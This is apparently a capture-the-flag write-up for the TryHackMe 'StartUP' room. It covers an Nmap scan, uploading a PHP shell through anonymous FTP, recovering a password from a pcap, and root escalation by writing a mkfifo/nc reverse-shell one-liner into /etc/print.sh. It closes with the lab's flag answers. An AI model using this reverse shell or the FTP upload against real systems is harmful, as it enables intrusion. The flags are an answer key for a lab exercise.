## StartUP

First of all Nmap scan

nmap -sC -sV -oN nScan -T5 10.10.27.254
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 00:01 EDT
Nmap scan report for 10.10.27.254
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.23.137.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.74 seconds


Here we can see the anonymous login via ftp is Allowed so we just need to login with empty password... i did that

Then found out we can upload files so i did uplod a RCE php file and ran it using browser under /files/ftp   with the Listner turned on i got the access...

In / directory i found recipe.txt with first ans that is 'love'

Now i need to get the password 

For that i got into the /incidents dir and found a pcapng file so i started a server in that folder and wget the file.

Running it in the wireshark i found long chain of traffic via tcp on port 4444

On seeing it in the plain text i found the password of the user lennei

'c4ntg3t3n0ughsp1c3'

did su - lennie
and entered the password and boom now  i have user access

in the home directory of lennie i found the user.txt 


to escalate our privilleges i just ran linpeas on the server and found that /etc/print.sh

i changed it a bit by

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.23.137.206 4444 >/tmp/f" > /etc/print.sh


and started a listner on my machine and boom we have got a root shell 

and boom  i got the root.txt file 


# Task 1 Welcome to Spice Hut!

1. What is the secret spicy soup recipe?

'''
love
'''

2. What are the contents of user.txt?

'''
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
'''

3. What are the contents of root.txt?

'''
THM{f963aaa6a430f210222158ae15c3d76d}
'''